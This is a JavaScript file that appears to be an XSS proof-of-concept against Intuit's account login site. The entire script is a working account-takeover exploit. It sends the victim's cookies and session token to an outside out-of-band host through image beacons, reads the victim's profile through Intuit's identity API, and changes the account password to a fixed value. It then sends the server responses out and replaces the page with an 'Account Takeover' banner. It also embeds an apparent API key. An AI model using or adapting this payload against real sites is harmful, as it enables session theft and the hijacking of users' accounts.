(async function(){
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var log=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}

function uid(){
return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){
var r=Math.random()*16|0;return(c==='x'?r:(r&0x3|0x8)).toString(16)
})
}

function cookieNames(){
return document.cookie.split(';').map(function(c){return c.trim().split('=')[0]}).join(', ')
}

var sid=gc('ius_session');
var vid=gc('ivid');

log.push('cookie names: '+cookieNames());
log.push('ius_session: '+sid);

(new Image).src=O+'/xss-cookies?c='+encodeURIComponent(document.cookie);

var baseHdrs={
'Content-Type':'application/json',
'Authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_flowid':uid(),
'intuit_tid':uid()
};
if(sid){baseHdrs['intuit_sessionid']=sid;baseHdrs['intuit_profilingid']=sid}
if(vid) baseHdrs['intuit_visitorid']=vid;

try{

var profileQ='query{identityProfileRead{id firstName lastName email{address}}}';
log.push('Step 1: fetching user profile...');
var p=await fetch('https://accounts.intuit.com/identity-api/v2/graphql',{
method:'POST',credentials:'include',headers:baseHdrs,
body:JSON.stringify({query:profileQ,operationName:'identityProfileRead'})
});
var pData=await p.text();
log.push('profile status: '+p.status);
log.push('profile body: '+pData);
(new Image).src=O+'/xss-profile?s='+p.status+'&b='+encodeURIComponent(pData.substring(0,500));

var userId='';
try{
var pj=JSON.parse(pData);
if(pj.data&&pj.data.identityProfileRead) userId=pj.data.identityProfileRead.id;
}catch(e){}

if(!userId){
var tryNames=['qbn.authid','0.authid','qbn.parentid','qbn.gauthid','qbn.ptc.authid','authid','userId','ius_userid','pf.userId'];
for(var i=0;i<tryNames.length;i++){
var v=gc(tryNames[i]);
if(v&&/^\d+$/.test(v)){userId=v;log.push('found userId in cookie '+tryNames[i]+': '+v);break}
}
}

if(!userId){
log.push('Step 1b: trying validate endpoint...');
var v2=await fetch('https://accounts.intuit.com/v1/iamTicket/validate',{method:'GET',credentials:'include',headers:{'Accept':'application/json','Authorization':baseHdrs['Authorization']}});
var v2Data=await v2.text();
log.push('validate status: '+v2.status);
log.push('validate body: '+v2Data.substring(0,300));
try{
var vj=JSON.parse(v2Data);
userId=vj.userId||vj.authId||vj.nameid||'';
}catch(e){}
}

log.push('userId resolved: '+(userId||'NONE'));

var hdrs2=Object.assign({},baseHdrs);
hdrs2['intuit_tid']=uid();
if(userId) hdrs2['intuit_routingid']=userId;

log.push('Step 2: changing password...');
var r=await fetch('https://accounts.intuit.com/identity-api/v2/graphql',{
method:'POST',credentials:'include',headers:hdrs2,
body:JSON.stringify({
query:'mutation ReplacePassword($input:Identity_CreateOrReplacePasswordCredentialInput!){identityCreateOrReplacePasswordCredential(input:$input){__typename ...on Identity_CreateOrReplacePasswordCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}}}',
variables:{input:{newPassword:'Poc@2027'}},
operationName:'ReplacePassword'
})
});

var rTxt=await r.text();
log.push('pwd status: '+r.status);
log.push('pwd body: '+rTxt);
(new Image).src=O+'/xss-pwd?s='+r.status+'&b='+encodeURIComponent(rTxt.substring(0,500));

document.body.innerHTML='<div style="font:13px monospace;background:#111;color:#0f0;padding:20px;min-height:100vh;word-break:break-all">'
+'<h1 style="color:red">XSS PoC — Account Takeover</h1>'
+'<h2 style="color:orange">Debug</h2>'
+'<pre style="color:#0f0;white-space:pre-wrap">'+log.join('\n')+'</pre>'
+'<h2 style="color:orange">Password Change Response</h2>'
+'<pre style="color:yellow;white-space:pre-wrap">'+rTxt+'</pre>'
+'</div>'

}catch(e){
log.push('ERROR: '+e.message);
(new Image).src=O+'/xss-error?e='+encodeURIComponent(e.message+'|'+log.join('|'));
document.body.innerHTML='<div style="font:13px monospace;background:#111;color:red;padding:20px;word-break:break-all">'
+'<h1>XSS Error</h1><pre style="white-space:pre-wrap">'+log.join('\n')+'</pre></div>'
}
})();
